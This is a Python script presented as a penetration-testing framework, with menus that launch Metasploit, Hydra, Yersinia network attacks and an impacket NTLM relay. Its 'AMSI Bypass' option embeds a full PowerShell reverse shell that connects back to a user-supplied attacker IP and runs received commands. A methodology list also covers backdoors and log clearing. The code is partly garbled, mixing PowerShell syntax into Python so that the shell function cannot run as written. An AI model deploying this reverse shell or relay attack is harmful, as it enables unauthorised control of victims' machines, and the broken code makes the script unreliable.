######################################################################################################################################################################################################################
# Python script Penetration Testing & Ethical Hacking Framework, Note: Be mindful of the scope of work, & rules of engagement.
# python pt_framework.py.
# Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software 
# without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons 
# to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial 
# portions of the Software.
# THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE 
# AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, 
# WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
######################################################################################################################################################################################################################


import subprocess
import sys
import os
import shutil
import time
from pathlib import Path
from colorama import Fore, Style

# Splash Screen
def display_splash_screen():
    splash = """
    
_____________________  ___________                                                  __                  _____  ______________  ___ ___    _____           _______  ____ 
\______   \__    ___/  \_   _____/____________     _____   ______  _  _____________|  | __             /  |  |/_   \______   \/   |   \  /  |  |          \   _  \/_   |
 |     ___/ |    |      |    __)  \_  __ \__  \   /     \_/ __ \ \/ \/ /  _ \_  __ \  |/ /   ______   /   |  |_|   ||     ___/    ~    \/   |  |_  ______ /  /_\  \|   |
 |    |     |    |      |     \    |  | \// __ \_|  Y Y  \  ___/\     (  <_> )  | \/    <   /_____/  /    ^   /|   ||    |   \    Y    /    ^   / /_____/ \  \_/   \   |
 |____|     |____|______\___  /    |__|  (____  /|__|_|  /\___  >\/\_/ \____/|__|  |__|_ \           \____   | |___||____|    \___|_ /\____   |           \_____  /___|
                 /_____/    \/                \/       \/     \/                        \/                |__|                      \/      |__|                 \/     

                                                     _:_
                                                    '-.-'
                                           ()      __.'.__
                                        .-:--:-.  |_______|
                                 ()      \____/    \=====/
                                 /\      {====}     )___(
                      (\=,      //\\      )__(     /_____\
      __    |'-'-'|  //  .\    (    )    /____\     |   |
     /  \   |_____| (( \_  \    )__(      |  |      |   |
     \__/    |===|   ))  `\_)  /____\     |  |      |   |
    /____\   |   |  (/     \    |  |      |  |      |   |
     |  |    |   |   | _.-'|    |  |      |  |      |   |
     |__|    )___(    )___(    /____\    /____\    /_____\
    (====)  (=====)  (=====)  (======)  (======)  (=======)
   (______)(_______)(_______)(________)(________)(_________)
   
    
    """
    print(f"{Fore.TEAL}{splash}{Style.RESET_ALL}")

# Columnar Display Helper Function
def display_in_columns(options, column_count=2):
    max_length = max(len(option) for option in options)
    formatted_options = [
        f"[{index+1}] {option:<{max_length}}" 
        for index, option in enumerate(options)
    ]
    for i in range(0, len(formatted_options), column_count):
        print("    ".join(formatted_options[i:i + column_count]))

# Check Tool Installation
def check_tool(tool_name):
    return shutil.which(tool_name) is not None

def install_tool(tool_name):
    if sys.platform.startswith("linux"):
        subprocess.run(["sudo", "apt-get", "install", "-y", tool_name])
    else:
        print(f"{Fore.RED}Automatic installation not supported on this OS.{Style.RESET_ALL}")

def check_and_install_tools(tools):
    for tool in tools:
        if not check_tool(tool):
            print(f"{Fore.RED}{tool} is not installed.{Style.RESET_ALL}")
            choice = input(f"Do you want to install {tool}? (y/n): ").lower()
            if choice == "y":
                install_tool(tool)

# Methodology Layout
def display_methodology():
    methodology = """
    Penetration Testing Methodology:

    1. Reconnaissance (Information Gathering)
        - Network Discovery
        - OS Fingerprinting
        - Service Enumeration

    2. Scanning & Enumeration
        - Vulnerability Scanning
        - Enumeration of SMB, DNS, HTTP, etc.
        - Port Scanning with Nmap

    3. Exploitation
        - Web Application Exploits
        - Network Exploits
        - Social Engineering Attacks

    4. Gaining Access
        - Brute Force Attacks (SSH, HTTP, SMB, etc.)
        - Remote Exploits
        - Web Shells

    5. Maintaining Access
        - Creating Backdoors
        - Installing Persistent Agents
        - Privilege Escalation

    6. Covering Tracks
        - Log Clearing
        - History Deletion
        - Traffic Spoofing

    7. Reporting & Results
        - Documenting Findings
        - Recommendations
        - Executive Summary

    """
    print(f"{Fore.TEAL}{methodology}{Style.RESET_ALL}")

# Reverse Shell Execution
def execute_reverse_shell(ip, port):
    code = f"""
$ip = '{ip}'
$port = {port}
$e = [System.Text.Encoding]::ASCII
$w = New-Object Net.Sockets.TCPClient($ip, $port)
$s = $w.GetStream()
$b = New-Object Byte[] 1024
while (($i = $s.Read($b, 0, $b.Length)) -ne 0) {{
    $d = ($e.GetString($b, 0, $i) -replace "`n","")
    $r = Invoke-Expression $d 2>&1 | Out-String
    $r2 = $r + "PS " + (pwd).Path + "> "
    $sb = $e.GetBytes($r2)
    $s.Write($sb, 0, $sb.Length)
    $s.Flush()
}}
"""
    # Convert and encode the PowerShell reverse shell script
    bytes = [System.Text.Encoding]::Unicode.GetBytes($code)
    encoded = [Convert]::ToBase64String($bytes)
    decoded = [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded))
    Invoke-Expression $decoded

# AMSI Bypass Menu
def amsi_bypass_menu():
    print(f"\n{Fore.TEAL}AMSI Bypass and Reverse Shell Execution:{Style.RESET_ALL}")
    # Prompt for Attacker IP and Port
    ip = input(f"{Fore.YELLOW}Enter the Attacker IP: {Style.RESET_ALL}")
    port = input(f"{Fore.YELLOW}Enter the Attacker Port: {Style.RESET_ALL}")
    
    # Ensure the port is numeric
    if not port.isdigit():
        print(f"{Fore.RED}Invalid port number! Please enter a valid port.{Style.RESET_ALL}")
        return

    # Convert the port to an integer and validate the range
    port = int(port)
    if port < 1 or port > 65535:
        print(f"{Fore.RED}Port number out of range! Please enter a valid port (1-65535).{Style.RESET_ALL}")
        return

    # Execute the reverse shell with the provided IP and Port
    execute_reverse_shell(ip, port)

# NTLM Relay Attack
def ntlm_relay_attack(target_ip, target_port):
    print(f"Running NTLM Relay Attack on {target_ip}:{target_port}...")
    command = f"python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py -t {target_ip}:{target_port} -smb2support"
    subprocess.run(command, shell=True)

# Gaining Access Menu updated
def gaining_access_menu():
    print(f"\n{Fore.TEAL}Gaining Access:{Style.RESET_ALL}")
    options = [
        "Launch MSFVenom",
        "Launch Metasploit",
        "Launch Veil",
        "Brute Force with Hydra",
        "Exploit SMB with EternalBlue",
        "Web Shell Upload",
        "Yersinia Suite",
        "AMSI Bypass and Reverse Shell Execution",
        "NTLM Relay Attack (Impacket)",
        "Return to Main Menu"
    ]
    display_in_columns(options, column_count=2)

    choice = input(f"\n{Fore.YELLOW}Enter your choice: {Style.RESET_ALL}")
    if choice == "8":
        amsi_bypass_menu()
    elif choice == "9":
        target_ip = input("Enter target IP for NTLM relay: ")
        target_port = input("Enter target port for NTLM relay: ")
        ntlm_relay_attack(target_ip, target_port)
    else:
        print(f"{Fore.RED}Invalid choice, returning to Gaining Access Menu.{Style.RESET_ALL}")
        gaining_access_menu()

def yersinia_menu():
    print(f"\n{Fore.TEAL}Yersinia Suite:{Style.RESET_ALL}")
    options = [
        "Launch Yersinia Interactive Mode",
        "Perform DHCP Attack",
        "Perform STP Attack",
        "Perform CDP Attack",
        "Perform VLAN Attack",
        "Return to Gaining Access Menu"
    ]
    display_in_columns(options, column_count=2)

    choice = input(f"\n{Fore.YELLOW}Enter your choice: {Style.RESET_ALL}")
    if choice == "1":
        subprocess.run(["yersinia", "-I"])
    elif choice == "2":
        subprocess.run(["yersinia", "-G", "-A", "dhcp"])
    elif choice == "3":
        subprocess.run(["yersinia", "-G", "-A", "stp"])
    elif choice == "4":
        subprocess.run(["yersinia", "-G", "-A", "cdp"])
    elif choice == "5":
        subprocess.run(["yersinia", "-G", "-A", "vlan"])
    elif choice == "6":
        gaining_access_menu()
    else:
        print(f"{Fore.RED}Invalid choice, returning to Gaining Access Menu.{Style.RESET_ALL}")
        gaining_access_menu()

# Main Menu
def main_menu():
    display_splash_screen()
    check_and_install_tools(['nmap', 'hydra', 'msfvenom', 'metasploit', 'veil', 'ysoserial', 'impacket'])

    options = [
        "Penetration Testing Methodology",
        "Gaining Access Menu",
        "Yersinia Suite",
        "Exit"
    ]
    display_in_columns(options)

    choice = input(f"\n{Fore.YELLOW}Enter your choice: {Style.RESET_ALL}")
    if choice == "1":
        display_methodology()
    elif choice == "2":
        gaining_access_menu()
    elif choice == "3":
        yersinia_menu()
    elif choice == "4":
        print(f"{Fore.RED}Exiting...{Style.RESET_ALL}")
        sys.exit()
    else:
        print(f"{Fore.RED}Invalid choice! Please try again.{Style.RESET_ALL}")
        main_menu()

# Run the program
if __name__ == "__main__":
    main_menu()
